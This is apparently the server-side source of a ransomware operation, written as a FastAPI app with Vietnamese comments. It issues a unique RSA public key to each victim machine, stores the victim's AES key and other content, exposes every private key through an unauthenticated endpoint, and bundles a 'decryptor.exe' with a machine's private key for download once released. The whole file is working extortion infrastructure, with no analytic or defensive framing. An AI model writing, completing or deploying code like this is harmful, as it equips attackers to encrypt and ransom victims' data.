from fileinput import filename
import zipfile

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from db import SessionLocal
from sqlalchemy import text
from models import Keys, MachineId, AddAES
from Crypto.PublicKey import RSA
import tempfile
import os

app = FastAPI()


origins = [
    "*"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/health")
def health_check():
    db = None
    try:
        db = SessionLocal()
        db.execute(text("SELECT 1"))
        return {"status": "healthy", "database": "connected"}
    except Exception as e:
        return {"status": "unhealthy", "database": str(e)}
    finally:
        if db:
            db.close()


@app.post("/add-aes-key")
def add_aes_key(key_info: AddAES):
    db = SessionLocal()
    try:
        existing = db.query(Keys).filter(
            Keys.machine_id == key_info.machine_id
        ).first()

        if existing:
            existing.aes_key = key_info.aes_key
            existing.content = key_info.content or ""
            db.commit()
            db.refresh(existing)

            return {
                "status": "updated",
                "machine_id": existing.machine_id,
                "key_id": existing.id
            }

        return {
            "status": "error",
            "message": "Machine not found in KEYS_LIST (must exist first)"
        }

    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}

    finally:
        db.close()

@app.get("/keys")
def get_keys():
    db = SessionLocal()
    try:
        keys = db.query(Keys).all()
        return {
            "keys": [
                {
                    "id": k.id,
                    "machine_id": k.machine_id,
                    "public_key": k.public_key,
                    "private_key": k.private_key,
                    "aes_key": k.aes_key,
                    "content": k.content or ""
                }
                for k in keys
            ]
        }
    finally:
        db.close()


@app.post("/get-public-key")
def get_public_key(payload: MachineId):
    db = SessionLocal()
    try:
        existing = db.query(Keys).filter(
            Keys.machine_id == payload.machine_id
        ).first()

        # nếu chưa có → tạo mới key pair
        if not existing:
            key = RSA.generate(2048)

            new_key = Keys(
                public_key=key.publickey().export_key().decode(),
                private_key=key.export_key().decode(),
                machine_id=payload.machine_id,
                aes_key=None,
                content=""
            )

            db.add(new_key)
            db.commit()

            return {"public_key": new_key.public_key}

        return {"public_key": existing.public_key}

    except Exception as e:
        db.rollback()
        return {"status": "error", "message": str(e)}

    finally:
        db.close()

@app.get("/get-private-key/{machine_id}")
def get_private_key(machine_id: str):

    db = SessionLocal()

    exe_path = "decryptor.exe"

    try:
        existing = db.query(Keys).filter(
            Keys.machine_id == machine_id
        ).first()

        if not existing or not existing.private_key:
            return {
                "status": "error",
                "message": "Private key not found for this machine"
            }

        # thư mục tạm KHÔNG auto delete
        temp_dir = tempfile.mkdtemp()

        key_file = os.path.join(temp_dir, "KEY.pem")

        with open(key_file, "w") as f:
            f.write(existing.private_key)

        zip_path = os.path.join(temp_dir, "decryptor.zip")

        with zipfile.ZipFile(zip_path, "w") as zipf:
            zipf.write(exe_path, arcname="decryptor.exe")
            zipf.write(key_file, arcname="KEY.pem")

        return FileResponse(
            path=zip_path,
            media_type="application/zip",
            filename="decryptor.zip"
        )

    finally:
        db.close()